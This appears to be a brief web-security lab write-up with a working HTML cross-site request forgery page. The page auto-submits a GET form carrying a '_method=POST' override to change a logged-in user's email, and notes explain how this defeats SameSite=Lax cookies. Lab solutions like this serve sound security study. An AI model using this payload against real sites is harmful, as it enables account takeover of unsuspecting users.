# Lab 7: SameSite Lax bypass via method override

```html
<html>
  <body>
    <form action="https://0ae100e60440270980c8b79400b8004f.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="_method" value="POST">
      <input type="hidden" name="email" value="test@test.com">
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

### 💡 Why This Works:

- **SameSite=Lax** allows `GET` requests during top-level navigation (like clicking a link or auto-submitting a form), but blocks `POST` requests with cookies.
- This lab’s backend **uses method override**, meaning if it sees `_method=POST` in a `GET` request, it treats it as a `POST`.
- Your exploit leverages this by sending a `GET` with `_method=POST`, bypassing the cookie protection.